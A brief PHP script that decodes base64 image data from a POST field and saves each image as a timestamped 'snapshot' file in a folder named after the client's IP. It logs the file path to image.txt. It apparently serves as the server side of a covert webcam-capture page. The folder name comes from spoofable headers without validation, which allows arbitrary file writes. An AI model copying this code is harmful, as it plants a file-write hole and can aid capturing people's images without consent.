<?php

$date = date('dMYHis');

if(!empty($_SERVER['HTTP_CLIENT_IP'])){
    $ips=$_SERVER['HTTP_CLIENT_IP'];}elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ips=$_SERVER['HTTP_X_FORWARDED_FOR'];}else{$ips=$_SERVER['REMOTE_ADDR'];}


if (!empty($_POST['caption'])) {
    $imageData=$_POST['caption'];

    $dir=$ips.'/snapshot'.$date.'.png';
    $wfile = fopen("image.txt",'w');
    
    fwrite($wfile, "file");fwrite($wfile, "=");
    fwrite($wfile, $dir);fwrite($wfile, "\r\n");
    fclose($wfile);

    $filteredData=substr($imageData, strpos($imageData, ",")+1);
    $unencodedData=base64_decode($filteredData);

    $wimg = fopen($dir,'wb' );
    fwrite($wimg, $unencodedData);fclose($wimg);

    exit();
}
?>

